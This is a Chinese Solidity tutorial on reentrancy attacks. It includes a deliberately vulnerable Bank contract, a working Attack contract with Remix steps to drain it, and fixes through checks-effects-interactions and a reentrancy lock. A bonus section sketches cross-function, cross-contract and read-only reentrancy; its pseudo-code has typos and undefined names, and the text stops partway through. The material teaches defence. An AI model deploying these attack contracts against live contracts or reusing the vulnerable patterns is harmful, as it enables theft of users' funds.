---
title: S01. 重入攻击
tags:
  - solidity
  - security
  - fallback
  - modifier
---

# WTF Solidity 合约安全: S01. 重入攻击

我最近在重新学 solidity，巩固一下细节，也写一个“WTF Solidity 极简入门”，供小白们使用（编程大佬可以另找教程），每周更新 1-3 讲。

推特：[@0xAA_Science](https://twitter.com/0xAA_Science)

社区：[Discord](https://discord.gg/5akcruXrsk)｜[微信群](https://docs.google.com/forms/d/e/1FAIpQLSe4KGT8Sh6sJ7hedQRuIYirOoZK_85miz3dw7vA1-YjodgJ-A/viewform?usp=sf_link)｜[官网 wtf.academy](https://wtf.academy)

所有代码和教程开源在 github: [github.com/AmazingAng/WTFSolidity](https://github.com/AmazingAng/WTFSolidity)

---

这一讲，我们将介绍最常见的一种智能合约攻击-重入攻击，它曾导致以太坊分叉为 ETH 和 ETC（以太经典），并介绍如何避免它。

## 重入攻击

重入攻击是智能合约中最常见的一种攻击，攻击者通过合约漏洞（例如 fallback 函数）循环调用合约，将合约中资产转走或铸造大量代币。

一些著名的重入攻击事件：

- 2016 年，The DAO 合约被重入攻击，黑客盗走了合约中的 3,600,000 枚 `ETH`，并导致以太坊分叉为 `ETH` 链和 `ETC`（以太经典）链。
- 2019 年，合成资产平台 Synthetix 遭受重入攻击，被盗 3,700,000 枚 `sETH`。
- 2020 年，借贷平台 Lendf.me 遭受重入攻击，被盗 $25,000,000。
- 2021 年，借贷平台 CREAM FINANCE 遭受重入攻击，被盗 $18,800,000。
- 2022 年，算法稳定币项目 Fei 遭受重入攻击，被盗 $80,000,000。

距离 The DAO 被重入攻击已经 6 年了，但每年还是会有几次因重入漏洞而损失千万美元的项目，因此理解这个漏洞非常重要。

## `0xAA` 抢银行的故事

为了让大家更好理解，这里给大家讲一个"黑客`0xAA`抢银行"的故事。

以太坊银行的柜员都是机器人（Robot），由智能合约控制。当正常用户（User）来银行取钱时，它的服务流程：

1. 查询用户的 `ETH` 余额，如果大于 0，进行下一步。
2. 将用户的 `ETH` 余额从银行转给用户，并询问用户是否收到。
3. 将用户名下的余额更新为`0`。

一天黑客 `0xAA` 来到了银行，这是他和机器人柜员的对话：

- 0xAA : 我要取钱，`1 ETH`。
- Robot: 正在查询您的余额：`1 ETH`。正在转帐`1 ETH`到您的账户。您收到钱了吗？
- 0xAA : 等等，我要取钱，`1 ETH`。
- Robot: 正在查询您的余额：`1 ETH`。正在转帐`1 ETH`到您的账户。您收到钱了吗？
- 0xAA : 等等，我要取钱，`1 ETH`。
- Robot: 正在查询您的余额：`1 ETH`。正在转帐`1 ETH`到您的账户。您收到钱了吗？
- 0xAA : 等等，我要取钱，`1 ETH`。
- ...

最后，`0xAA`通过重入攻击的漏洞，把银行的资产搬空了，银行卒。

![](./img/S01-1.png)

## 漏洞合约例子

### 银行合约

银行合约非常简单，包含`1`个状态变量`balanceOf`记录所有用户的以太坊余额；包含`3`个函数：

- `deposit()`：存款函数，将`ETH`存入银行合约，并更新用户的余额。
- `withdraw()`：提款函数，将调用者的余额转给它。具体步骤和上面故事中一样：查询余额，转账，更新余额。**注意：这个函数有重入漏洞！**
- `getBalance()`：获取银行合约里的`ETH`余额。

```solidity
contract Bank {
    mapping (address => uint256) public balanceOf;    // 余额mapping

    // 存入ether，并更新余额
    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // 提取msg.sender的全部ether
    function withdraw() external {
        uint256 balance = balanceOf[msg.sender]; // 获取余额
        require(balance > 0, "Insufficient balance");
        // 转账 ether !!! 可能激活恶意合约的fallback/receive函数，有重入风险！
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");
        // 更新余额
        balanceOf[msg.sender] = 0;
    }

    // 获取银行合约的余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

### 攻击合约

重入攻击的一个攻击点就是合约转账`ETH`的地方：转账`ETH`的目标地址如果是合约，会触发对方合约的`fallback`（回退）函数，从而造成循环调用的可能。如果你不了解回退函数，可以阅读[WTF Solidity 极简教程第 19 讲：接收 ETH](https://github.com/AmazingAng/WTFSolidity/blob/main/19_Fallback/readme.md)。`Bank`合约在`withdraw()`函数中存在`ETH`转账：

```
(bool success, ) = msg.sender.call{value: balance}("");
```

假如黑客在攻击合约中的`fallback()`或`receive()`函数中重新调用了`Bank`合约的`withdraw()`函数，就会造成`0xAA`抢银行故事中的循环调用，不断让`Bank`合约转账给攻击者，最终将合约的`ETH`提空。

```solidity
    receive() external payable {
        bank.withdraw();
    }
```

下面我们看下攻击合约，它的逻辑非常简单，就是通过`receive()`回退函数循环调用`Bank`合约的`withdraw()`函数。它有`1`个状态变量`bank`用于记录`Bank`合约地址。它包含`4`个函数：

- 构造函数: 初始化`Bank`合约地址。
- `receive()`: 回调函数，在接收`ETH`时被触发，并再次调用`Bank`合约的`withdraw()`函数，循环提款。
- `attack()`：攻击函数，先`Bank`合约的`deposit()`函数存款，然后调用`withdraw()`发起第一次提款，之后`Bank`合约的`withdraw()`函数和攻击合约的`receive()`函数会循环调用，将`Bank`合约的`ETH`提空。
- `getBalance()`：获取攻击合约里的`ETH`余额。

```solidity
contract Attack {
    Bank public bank; // Bank合约地址

    // 初始化Bank合约地址
    constructor(Bank _bank) {
        bank = _bank;
    }

    // 回调函数，用于重入攻击Bank合约，反复的调用目标的withdraw函数
    receive() external payable {
        if (bank.getBalance() >= 1 ether) {
            bank.withdraw();
        }
    }

    // 攻击函数，调用时 msg.value 设为 1 ether
    function attack() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    // 获取本合约的余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

## `Remix`演示

1. 部署`Bank`合约，调用`deposit()`函数，转入`20 ETH`。
2. 切换到攻击者钱包，部署`Attack`合约。
3. 调用`Attack`合约的`attack()`函数发动攻击，调用时需转账`1 ETH`。
4. 调用`Bank`合约的`getBalance()`函数，发现余额已被提空。
5. 调用`Attack`合约的`getBalance()`函数，可以看到余额变为`21 ETH`，重入攻击成功。

## 预防办法

目前主要有两种办法来预防可能的重入攻击漏洞： 检查-影响-交互模式（checks-effect-interaction）和重入锁。

### 检查-影响-交互模式

检查-影响-交互模式强调编写函数时，要先检查状态变量是否符合要求，紧接着更新状态变量（例如余额），最后再和别的合约交互。如果我们将`Bank`合约`withdraw()`函数中的更新余额提前到转账`ETH`之前，就可以修复漏洞：

```solidity
function withdraw() external {
    uint256 balance = balanceOf[msg.sender];
    require(balance > 0, "Insufficient balance");
    // 检查-效果-交互模式（checks-effect-interaction）：先更新余额变化，再发送ETH
    // 重入攻击的时候，balanceOf[msg.sender]已经被更新为0了，不能通过上面的检查。
    balanceOf[msg.sender] = 0;
    (bool success, ) = msg.sender.call{value: balance}("");
    require(success, "Failed to send Ether");
}
```

### 重入锁

重入锁是一种防止重入函数的修饰器（modifier），它包含一个默认为`0`的状态变量`_status`。被`nonReentrant`重入锁修饰的函数，在第一次调用时会检查`_status`是否为`0`，紧接着将`_status`的值改为`1`，调用结束后才会再改为`0`。这样，当攻击合约在调用结束前第二次的调用就会报错，重入攻击失败。如果你不了解修饰器，可以阅读[WTF Solidity 极简教程第 11 讲：修饰器](https://github.com/AmazingAng/WTFSolidity/blob/main/11_Modifier/readme.md)。

```solidity
uint256 private _status; // 重入锁

// 重入锁
modifier nonReentrant() {
    // 在第一次调用 nonReentrant 时，_status 将是 0
    require(_status == 0, "ReentrancyGuard: reentrant call");
    // 在此之后对 nonReentrant 的任何调用都将失败
    _status = 1;
    _;
    // 调用结束，将 _status 恢复为0
    _status = 0;
}
```

只需要用`nonReentrant`重入锁修饰`withdraw()`函数，就可以预防重入攻击了。

```solidity
// 用重入锁保护有漏洞的函数
function withdraw() external nonReentrant{
    uint256 balance = balanceOf[msg.sender];
    require(balance > 0, "Insufficient balance");

    (bool success, ) = msg.sender.call{value: balance}("");
    require(success, "Failed to send Ether");

    balanceOf[msg.sender] = 0;
}
```

此外，OpenZeppelin 也提倡遵循 PullPayment(拉取支付)模式以避免潜在的重入攻击。其原理是通过引入第三方(escrow)，将原先的“主动转账”分解为“转账者发起转账”加上“接受者主动拉取”。当想要发起一笔转账时，会通过`_asyncTransfer(address dest, uint256 amount)`将待转账金额存储到第三方合约中，从而避免因重入导致的自身资产损失。而当接受者想要接受转账时，需要主动调用`withdrawPayments(address payable payee)`进行资产的主动获取。

## 总结

这一讲，我们介绍了以太坊最常见的一种攻击——重入攻击，并编了一个`0xAA`抢银行的小故事方便大家理解，最后我们介绍了两种预防重入攻击的办法：检查-影响-交互模式（checks-effect-interaction）和重入锁。在例子中，黑客利用了回退函数在目标合约进行`ETH`转账时进行重入攻击。实际业务中，`ERC721`和`ERC1155`的`safeTransfer()`和`safeTransferFrom()`安全转账函数，还有`ERC777`的回退函数，都可能会引发重入攻击。对于新手，我的建议是用重入锁保护所有可能改变合约状态的`external`函数，虽然可能会消耗更多的`gas`，但是可以预防更大的损失。

## 彩蛋环节

当谈到智能合约安全时，重入攻击永远是一个备受关注的话题。在上述内容中，`0xAA`生动展示了教科书级经典的重入攻击思路；而在生产环境中，常常有一些更加安排巧妙，复杂的实例一直在以各种新瓶装旧酒的面目不断地出现，并且成功地对很多项目造成了破坏。这些实例展示了攻击者如何利用智能合约中的漏洞来搭配组合出精心策划的攻击。在这个彩蛋环节中，我们将利用一些生产环境中真实发生的重入攻击案例，简化并提炼其操作，探讨攻击者的思路、利用的漏洞以及对应的防御措施。通过了解这些实例，我们可以更好地理解重入攻击的本质，并且提高我们编写安全智能合约的技能和意识。

注：以下所展示的代码示例均为简化过的`pseudo-code`, 主要以阐释攻击思路为目的。内容源自众多`Web3 Security Researchers`所分享的审计案例,感谢他们的贡献！

### 1. 跨函数重入攻击

*那一年，我戴了重入锁，不知对手为何物。直到那天，那个男人从天而降，还是卷走了我的银钱... -- 戴锁婆婆*

请看如下代码示例：
```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract VulnerableBank {
  mapping(address => uint256) public balances;

  uint256 private _status; // 重入锁

  // 重入锁
  modifier nonReentrant() {
      // 在第一次调用 nonReentrant 时，_status 将是 0
       require(_status == 0, "ReentrancyGuard: reentrant call");
      // 在此之后对 nonReentrant 的任何调用都将失败
      _status = 1;
      _;
      // 调用结束，将 _status 恢复为0
      _status = 0;
  }

  function deposit() external payable {
    require(msg.value > 0, "Deposit amount must ba greater than 0");
    balances[msg.sender] += msg.value;
  }

  function withdraw(uint256 _amount) external nonReentrant {
    uint256 balance = balances[msg.sender];
    require(balance >= _amount, "Insufficient balance");

    (bool success, ) = msg.sender.call{value: _amount}("");
    require(success, "Withdraw failed");

    balances[msg.sender] = balance - _amount;
  }

  function transfer(address _to, uint256 _amount) external {
    uint256 balance = balances[msg.sender];
    require(balance >= _amount, "Insufficient balance");

    balances[msg.sender] -= _amount;
    balances[_to] += _amount;
  }
}
```

在上面的`VulnerableBank`合约中，可以看到转账`ETH`的步骤仅存在于`withdraw`这一个函数之内，而此函数已经使用了重入锁`nonReentrant`。那么，还有什么方法来对这个合约进行重入攻击呢？

请看如下攻击者合约示例：

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "../IVault.sol";

contract Attack2Contract {
    address victim;
    address owner;

    constructor(address _victim, address _owner) {
        victim = _victim;
        owner = _owner;
    }

    function deposit() external payable {
        IVault(victim).deposit{value: msg.value}("");
    }

    function withdraw() external {
        Ivault(victim).withdraw();
    }

    receive() external payable {
        uint256 balance = Ivault(victim).balances[address(this)];
        Ivault(victim).transfer(owner, balance);
    }
}
```

如上所示，攻击者重入的不再是`withdraw`函数，而是转头去重入没有戴锁的`transfer`函数。`VulnerableBank`合约的设计者的固有思路认为`transfer`函数中只是更改 `balances mapping`而没有转账`ETH`的步骤，所以应该不是重入攻击的对象，所以没有给它加上锁。而攻击者利用`withdraw`先将`ETH`转账，转账完成的时候`balances`没有立即更新，而随机调用了`transfer`函数将自己原本已不存在的余额成功转移给了另一个地址`owner`，而此地址完全可以是攻击者的一个小号而已。由于`transfer`函数没有转账`ETH`所以不会持续将执行权交出，所以这个重入只是攻击了额外一次便结束。结果是攻击者“无中生有”出了这一部分钱，实现了“双花”的功效。

那么问题来了：

*如果改进一下， 将合约中的所有跟资产转移沾边的函数都加上重入锁，那是不是就安全了呢？？？*

请看下面的进阶案例...

### 2. 跨合约重入攻击

现在我们的受害者是一个双合约组合系统。第一个合约是`TwoStepSwapManager`, 它是面向用户的合约，里面包含有允许用户直接发起的提交一个swap交易的函数，还有同样是可由用户发起的，用来取消正在等待执行但尚未执行的swap交易的函数；第二个合约是`TwoStepSwapExecutor`, 它是只能由管理的角色来发起的交易，用于执行某个处于等待中的swap交易。这两个合约的 *部分* 示例代码如下：

```
// Contracts to create and manage swap "requests"

contract TwoStepSwapManager {
    struct Swap {
        address user;
        uint256 amount;
        address[] swapPath;
        bool unwrapnativeToken;
    }

    uint256 swapNonce;
    mapping(uint256 => Swap) pendingSwaps;

    uint256 private _status; // 重入锁

    // 重入锁
    modifier nonReentrant() {
      // 在第一次调用 nonReentrant 时，_status 将是 0
        require(_status == 0, "ReentrancyGuard: reentrant call");
      // 在此之后对 nonReentrant 的任何调用都将失败
        _status = 1;
        _;
      // 调用结束，将 _status 恢复为0
        _status = 0;
     }

    function createSwap(uint256 _amount, address[] _swapPath, bool _unwrapnativeToken) external nonReentrant {
        IERC20(swapPath[0]).safeTransferFrom(msg.sender, _amount);
        pendingSwaps[++swapNounce] = Swap({
            user: msg.sender,
            amount: _amount,
            swapPath: _swapPath,
            unwrapNativeToken: _unwrapNativeToken
        });
    }

    function cancelSwap(uint256 _id) external nonReentrant {
        Swap memory swap = pendingSwaps[_id];
        require(swap.user == msg.sender);
        delete pendingSwaps[_id];

        IERC20(swapPath[0]).safeTransfer(swap.user, swap.amount);
    }
}
```

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

// Contract to exeute swaps

contract TwoStepSwapExecutor {


    /* 
        Logic to set prices etc... 
    */


    uint256 private _status; // 重入锁

    // 重入锁
    modifier nonReentrant() {
      // 在第一次调用 nonReentrant 时，_status 将是 0
        require(_status == 0, "ReentrancyGuard: reentrant call");
      // 在此之后对 nonReentrant 的任何调用都将失败
        _status = 1;
        _;
      // 调用结束，将 _status 恢复为0
        _status = 0;
    }

    function executeSwap(uint256 _id) external onlySwapExecutor nonReentrant {
        Swap memory swap = ISwapManager(swapManager).pendingSwaps(_id);

        // If a swapPath ends in WETH and unwrapNativeToken == true, send ether to the user
        ISwapManager(swapManager).swap(swap.user, swap.amount, swap.swapPath, swap.unwrapNativeToken);

        ISwapManager(swapManager).delete(pendingSwaps[_id]);
    }
}
```

从上面两个合约的示例代码可以看出，所有相关的函数均使用了重入锁。然而，那个男人还是成功地对戴锁婆婆施展了重入魔法，再再再一次卷走了原本不属于他的钱财。这一次，他又是如何做到的呢？

俗话说得好， *“灯下黑“* ，答案就在最表面上反而容易被忽视 --- 因为这是 两 个 合 约...锁的状态是不互通的！ 管理员调用了`executeSwap`来执行了那个攻击者提交的swap，此合约的重入锁开始生效变成`1`。当运行到中间那步`swap（）`的时候，发起了`ETH`转账，将执行权交给了攻击者的恶意合约的`fallback`函数，在那里被设置了对`TwoStepSwapManager`合约的`cancelSwap`函数的调用，而此时这个合约的重入锁还是`0`，所以`cancelSwap`开始执行，此合约的重入锁开始生效变成`1`，然而为时已晚。。。 攻击者收到了`executeSwap`发送给他的swap过来的`ETH`，同时还收到了`cancelSwap`退给他的当初送出去用来swap的本金代币。他他他又一次“无中生有”了！

攻击者这么狡猾，你看他来不来气？ 别急，往下看，还有...

### 跨项目重入攻击

越写越大了。。。所谓跨项目的重入攻击，其核心与上面两例其实也是比较类似。本质就是趁某项目合约的某个状态变量在还未来得及更新时，就利用接手的执行权来发起外部函数调用。如果有第三方合作项目的合约是依赖于前面提到的项目合约里这个状态变量的值来做某些决策的，那么攻击者就可以去攻击这个合作项目的合约，因为在此刻它读到的是一个过期的状态值，会导致它执行一些错误的行为令攻击者获利。 通常，合作项目的合约通过一些`getter`函数或其他只读函数的调用来传递信息，所以这类攻击也通常体现为`只读重入攻击 Read-Only Reentrancy`。

请看如下示例代码：

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract VulnerableBank {
  mapping(address => uint256) public balances;

  uint256 private _status; // 重入锁

  // 重入锁
  modifier nonReentrant() {
      // 在第一次调用 nonReentrant 时，_status 将是 0
       require(_status == 0, "ReentrancyGuard: reentrant call");
      // 在此之后对 nonReentrant 的任何调用都将失败
      _status = 1;
      _;
      // 调用结束，将 _status 恢复为0
      _status = 0;
  }

  function deposit() external payable {
    require(msg.value > 0, "Deposit amount must ba greater than 0");
    balances[msg.sender] += msg.value;
  }

  function withdraw(uint256 _amount) external nonReentrant {
    require(_amount > 0, "Withdrawal amount must be greater than 0");
    require(isAllowedToWithdraw(msg.sender, _amount), "Insufficient balance");

    (bool success, ) = msg.sender.call{value: _amount}("");
    require(success, "Withdraw failed");

    balances[msg.sender] -= _amount;
  }

  function isAllowedToWithdraw(address _user, uint256 _amount) public view returns(bool) {
    return balances[_user] >= _amount;
  }
}
```

